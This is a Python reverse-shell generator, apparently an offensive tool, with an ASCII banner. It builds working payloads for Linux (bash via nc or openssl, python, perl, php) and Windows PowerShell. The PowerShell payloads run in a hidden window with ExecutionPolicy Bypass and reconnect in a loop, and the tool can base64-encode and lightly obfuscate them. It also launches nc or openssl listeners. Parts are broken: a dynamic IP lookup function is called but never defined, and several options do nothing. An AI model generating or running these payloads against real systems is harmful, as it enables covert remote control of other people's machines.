import base64
import os
import subprocess
import random
import string
import socket

ascii_art = """
██████  ███████ ██    ██  ██████ ██   ██ ███████ ███████ ██   ██ ███████ ██      ██          
██   ██ ██       ██  ██  ██      ██   ██ ██      ██      ██   ██ ██      ██      ██          
██████  ███████   ████   ██      ███████ █████   ███████ ███████ █████   ██      ██          
██           ██    ██    ██      ██   ██ ██           ██ ██   ██ ██      ██      ██          
██      ███████    ██     ██████ ██   ██ ███████ ███████ ██   ██ ███████ ███████ ███████     
"""

print(ascii_art)

print(" " * 60 + "Created by Panagiotis Mavrogiannis")

def random_string(length=8):
    return ''.join(random.choice(string.ascii_letters) for _ in range(length))

def obfuscate_code(reverse_shell):
    obfuscated_shell = reverse_shell.replace("$client", "$cl")
    obfuscated_shell = obfuscated_shell.replace("$sslStream", "$ss")
    obfuscated_shell = obfuscated_shell.replace("$stream", "$st")
    obfuscated_shell = obfuscated_shell.replace("$reader", "$rd")
    obfuscated_shell = obfuscated_shell.replace("$writer", "$wr")
    obfuscated_shell = obfuscated_shell.replace("$result", "$res")
    
    obfuscated_shell += " #This is an obfuscated shell code"
    return obfuscated_shell

def create_reverse_shell(os_type, shell_type, listener_ip, listener_port, encode=False, obfuscate=False, staged=False, ssl=False, persistence=False):
    reverse_shell = ""
    
    if os_type == "Linux":
        if shell_type == "bash":
            if ssl:
                reverse_shell = (
                    f"setsid bash -c 'while true; do rm -f /tmp/s; mkfifo /tmp/s; "
                    f"/bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {listener_ip}:{listener_port} > /tmp/s; "
                    f"rm /tmp/s; sleep 60; done' "
                )
            else:
                reverse_shell = (
                    f"setsid bash -c 'while true; do rm -f /tmp/s; mkfifo /tmp/s; "
                    f"/bin/sh -i < /tmp/s 2>&1 | nc -q 0 {listener_ip} {listener_port} > /tmp/s; "
                    f"rm /tmp/s; sleep 60; done' &"
                )
        elif shell_type == "python":
            reverse_shell = (
                "python3 -c \"import socket, os, pty; "
                f"s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\\\"{listener_ip}\\\", {listener_port})); "
                "os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); "
                "pty.spawn(\\\"/bin/sh\\\")\""
            )
        elif shell_type == "php":
            reverse_shell = f"<?php $sock=fsockopen('{listener_ip}', {listener_port});exec('/bin/sh -i <&3 >&3 2>&3');?>"
        elif shell_type == "perl":
            reverse_shell = f"perl -e 'use Socket;$i=\"{listener_ip}\";$p={listener_port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
    
    elif os_type == "Windows":
        if shell_type == "powershell":
            if ssl:
                reverse_shell = (
                    f"$command = {{"
                    f"while($true){{"
                    f"try {{"
                    f"$cl = New-Object System.Net.Sockets.TcpClient('{listener_ip}', {listener_port});"
                    f"$ss = New-Object System.Net.Security.SslStream($cl.GetStream(), $false, "
                    f"({{ $true }} -as [Net.Security.RemoteCertificateValidationCallback]));"
                    f"$ss.AuthenticateAsClient('');"
                    f"$rd = New-Object IO.StreamReader($ss);"
                    f"$wr = New-Object IO.StreamWriter($ss);"
                    f"$wr.AutoFlush = $true;"
                    f"while($cl.Connected){{"
                    f"$cmd = $rd.ReadLine();"
                    f"if($cmd -eq 'exit'){{break}};"
                    f"try{{$res = iex $cmd 2>&1 | Out-String;}}"
                    f"catch{{$res = $_.Exception.Message;}}"
                    f"$wr.WriteLine($res);$wr.Flush();"
                    f"}}"
                    f"$cl.Close();"
                    f"}}"
                    f"catch {{Start-Sleep -Seconds 10;}}"
                    f"Start-Sleep -Seconds 60;"
                    f"}}"
                    f"}}; Start-Process powershell -WindowStyle Hidden -ArgumentList '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', $command"
                )
            else:
                reverse_shell = (
                    f"$command = {{"
                    f"while($true){{"
                    f"try {{"
                    f"$cl = New-Object System.Net.Sockets.TcpClient('{listener_ip}', {listener_port});"
                    f"$st = $cl.GetStream();"
                    f"$rd = New-Object IO.StreamReader($st);"
                    f"$wr = New-Object IO.StreamWriter($st);"
                    f"$wr.AutoFlush = $true;"
                    f"while($cl.Connected){{"
                    f"$cmd = $rd.ReadLine();"
                    f"if($cmd -eq 'exit'){{break}};"
                    f"try{{$res = iex $cmd 2>&1 | Out-String;}}"
                    f"catch{{$res = $_.Exception.Message;}}"
                    f"$wr.WriteLine($res);$wr.Flush();"
                    f"}}"
                    f"$cl.Close();"
                    f"}}"
                    f"catch {{Start-Sleep -Seconds 10;}}"
                    f"Start-Sleep -Seconds 60;"
                    f"}}"
                    f"}}; Start-Process powershell -WindowStyle Hidden -ArgumentList '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', $command"
                )

    if obfuscate:
        reverse_shell = obfuscate_code(reverse_shell)
    
    if encode:
        reverse_shell = base64.b64encode(reverse_shell.encode()).decode()
        if os_type == "Windows" and shell_type == "powershell":
            reverse_shell = f"powershell -encodedCommand {reverse_shell}"
        elif os_type == "Linux" and shell_type == "bash":
            reverse_shell = f"echo {reverse_shell} | base64 -d | bash"
        else:
            reverse_shell = f"echo {reverse_shell} | base64 -d"

    return reverse_shell

def add_persistence(os_type, shell_code):
    persistence_code = ""
    
    if os_type == "Linux":
        persistence_code = f"{shell_code}"
    
    elif os_type == "Windows":
        persistence_code = (
            f"while($true){{"
            f"{shell_code};"
            f"Start-Sleep -Seconds 60;"
            f"}}"
        )
    
    return persistence_code

def setup_encrypted_listener(listener_ip, listener_port):
    print(f"Setting up encrypted listener on {listener_ip}:{listener_port} with OpenSSL...")
    subprocess.call(f"sudo openssl s_server -quiet -key key.pem -cert cert.pem -port {listener_port}", shell=True)

def setup_listener(listener_ip, listener_port):
    print(f"Setting up non-encrypted listener on {listener_ip}:{listener_port}...")
    subprocess.call(f"nc -lvnp {listener_port}", shell=True)

if __name__ == "__main__":
    print("Choose the target operating system:")
    print("1. Linux")
    print("2. Windows")
    os_choice = input("Enter choice (1 or 2): ").strip()
    
    if os_choice == "1":
        os_type = "Linux"
        print("\nChoose the type of shell:")
        print("1. Bash")
        print("2. Python")
        print("3. PHP")
        print("4. Perl")
        shell_choice = input("Enter choice (1-4): ").strip()

        if shell_choice == "1":
            shell_type = "bash"
        elif shell_choice == "2":
            shell_type = "python"

            # Simplified Python Shell (No SSL, No Persistence)
            listener_ip = input("\nEnter the listener IP address (e.g., 0.0.0.0 for all interfaces): ").strip()
            listener_port = input("Enter the listener port: ").strip()

            shell_code = create_reverse_shell(os_type, shell_type, listener_ip, listener_port)
            print(f"\nGenerated Python Reverse Shell:\n\n{shell_code}")
            
            if input("Do you want to automatically set up a listener? (y/n): ").strip().lower() == "y":
                setup_listener(listener_ip, int(listener_port))
            exit()  # Exit after processing Python option
            
        elif shell_choice == "3":
            shell_type = "php"
        elif shell_choice == "4":
            shell_type = "perl"
        else:
            print("Invalid choice. Exiting.")
            exit()
        
        dynamic_choice = input("\nDo you want to retrieve IP/port dynamically? (y/n): ").strip().lower()
        if dynamic_choice == "y":
            listener_ip, listener_port = dynamic_ip_port_retrieval()
            print(f"Dynamically retrieved IP: {listener_ip}, Port: {listener_port}")
        else:
            listener_ip = input("\nEnter the listener IP address (e.g., 0.0.0.0 for all interfaces): ").strip()
            listener_port = input("Enter the listener port: ").strip()

        ssl_choice = input("Do you want to use SSL encryption? (y/n): ").strip().lower()
        persistence_choice = input("Do you want to add persistence in memory? (y/n): ").strip().lower()

        ssl = True if ssl_choice == "y" else False
        encode = False
        obfuscate = False
        staged = False
        persistence = True if persistence_choice == "y" else False

    elif os_choice == "2":
        os_type = "Windows"
        print("\nChoose the type of shell:")
        print("1. PowerShell")
        print("2. CMD (using PowerShell)")
        shell_choice = input("Enter choice (1 or 2): ").strip()
        
        if shell_choice == "1":
            shell_type = "powershell"
        elif shell_choice == "2":
            shell_type = "cmd"
        else:
            print("Invalid choice. Exiting.")
            exit()
        
        dynamic_choice = input("\nDo you want to retrieve IP/port dynamically? (y/n): ").strip().lower()
        if dynamic_choice == "y":
            listener_ip, listener_port = dynamic_ip_port_retrieval()
            print(f"Dynamically retrieved IP: {listener_ip}, Port: {listener_port}")
        else:
            listener_ip = input("\nEnter the listener IP address (e.g., 0.0.0.0 for all interfaces): ").strip()
            listener_port = input("Enter the listener port: ").strip()

        encode_choice = input("Do you want to encode the payload? (y/n): ").strip().lower()
        obfuscate_choice = input("Do you want to obfuscate the payload? (y/n): ").strip().lower()
        staged_choice = input("Do you want to use a staged payload? (y/n): ").strip().lower()
        ssl_choice = input("Do you want to use SSL encryption? (y/n): ").strip().lower()
        persistence_choice = input("Do you want to add persistence in memory? (y/n): ").strip().lower()
        
        encode = True if encode_choice == "y" else False
        obfuscate = True if obfuscate_choice == "y" else False
        staged = True if staged_choice == "y" else False
        ssl = True if ssl_choice == "y" else False
        persistence = True if persistence_choice == "y" else False

    else:
        print("Invalid choice. Exiting.")
        exit()
    
    shell_code = create_reverse_shell(os_type, shell_type, listener_ip, listener_port, encode, obfuscate, staged, ssl, persistence)
    
    print(f"\nGenerated Reverse Shell with Persistence:\n\n{shell_code}")
    
    if input("Do you want to automatically set up a listener? (y/n): ").strip().lower() == "y":
        if ssl and shell_type != "python":
            setup_encrypted_listener(listener_ip, int(listener_port))
        else:
            setup_listener(listener_ip, int(listener_port))
